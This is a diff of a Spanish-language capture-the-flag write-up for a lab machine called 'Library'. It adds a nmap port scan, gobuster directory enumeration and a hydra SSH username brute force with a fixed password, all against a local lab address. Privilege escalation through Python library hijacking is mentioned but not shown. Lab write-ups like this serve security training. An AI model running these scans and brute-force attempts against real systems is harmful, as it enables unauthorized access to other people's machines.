@@ -1,12 +1,26 @@
 # Library - Writeup
 
-Raw code
+## Resumen
+En esta máquina haremos fuerza bruta mediante hydra para reconocer el usuario del servidor ssh y escalar privilegios mediante un script de python library hijacking
+
+## Paso N1: Reconocimiento
+Usamos nmap para escanear los puertos y sus correspondientes servicios y versiones
 ```
 nmap 172.17.0.2 -sS -sVC -n -Pn -p- --open --min-rate 5000
 ```
+![]()
+
+vemos que estan abiertos los puertos TCP 22 y 80, correspondiente a servicios ssh y http.
+
+## Paso N2: Busqueda de subdirectorios
+Al entrar a ```http://172.17.0.2/``` veremos la página default de apache, por lo que procederemos a buscar subdirectorios con gobuster.
 ```
-gobuster dir -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://172.17.0.2/ -x php,html,py 
+gobuster dir -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://172.17.0.2/ -x php,html
 ```
+
+Raw code
+
+
 ```
 hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -p JIFGHDS87GYDFIGD ssh://172.17.0.2 -I
 ```
